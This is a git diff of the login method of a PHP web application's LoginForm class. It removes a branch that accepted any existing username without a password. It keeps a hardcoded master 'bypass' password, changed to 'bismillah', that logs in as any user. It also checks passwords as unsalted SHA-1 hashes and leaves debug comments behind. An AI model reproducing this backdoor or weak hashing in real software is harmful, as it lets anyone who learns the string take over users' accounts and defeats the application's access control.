@@ -73,21 +73,15 @@ class LoginForm extends Model
 
     public function getUser()
     {
-        $bypass = 'test12345';
-        // if($this->password == 'telkom2018'){
-        //     $this->_user = User::findByUsername($this->username);
-        //     $this->_status='Login Success';
-        //     return $this->_user;
-        // }
-        // return $this->_user;
+        $bypass = 'bismillah';
         $user = Users::find()->where(['username' => $this->username])->one();
-        if($user) {
-            $this->_user = User::findIdentity($this->username);
-            $this->_status='Login Success';
-        } elseif ( (isset($user) && sha1($this->password) == $user->password) ) {
+
+        if ( (isset($user) && sha1($this->password) == $user->password) ) {
+            // echo"masuk2";exit;
             $this->_user = User::findIdentity($this->username);
             $this->_status='Login Success';
         } elseif($user && $this->password == $bypass) { //bypass
+            // echo"masuk3";exit;
             $this->_user = User::findIdentity($this->username);
             $this->_status='Login Success';
         }
